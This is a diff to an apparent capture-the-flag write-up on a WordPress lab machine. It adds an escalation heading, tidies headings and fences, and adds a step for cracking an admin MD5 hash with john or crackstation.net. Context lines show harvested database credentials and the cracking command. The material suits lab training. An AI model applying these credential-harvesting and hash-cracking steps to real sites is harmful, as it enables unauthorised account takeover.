@@ -273,6 +273,8 @@ cat local.txt
 www-data@ubuntu:/home/btrisk$ 
 ```
 
+## ESCALATION
+
 
 #### CHECKING THE WP-CONTENT.PHP FILE FROM WORDPRESS
 
@@ -425,7 +427,7 @@ www-data@ubuntu:/var/www/html/wordpress$
 
 ```
 
-#### fINDINGS -DATABASE USER
+#### FINDINGS-DATABASE USER
 ```PYTHON
 DATABASE USER:root
 password: rootpassword
@@ -471,7 +473,7 @@ Enter password: rootpassword!
 | wp_usermeta                |
 | wp_users                   |
 +----------------------------+
-
+```
 ```python
 User tables are always interesting to enumerate. Inside the wp_users table, we find a couple of records:
 ```
@@ -499,8 +501,11 @@ admin: 21232f297a57a5a743894a0e4a801fc3
 ```python
 1. first save the hash in afile called hash
 2. Then use john to crack the password by the following command
-3.Command: john --format=raw-MD5 hash
+3.Command: john --format=raw-MD5 hash 
+4 aLTERNATIVELY WE CAN CRACH THE HASH BY USING (https://crackstation.net/)
 ```
+![HAHS CRACKER](https://user-images.githubusercontent.com/98345027/188377248-5496924d-c281-41a3-a514-a10fb4a247f3.png)
+
 ```python
 ──(dx㉿kali)-[~]
 └─$ john --format=raw-MD5 hash                            
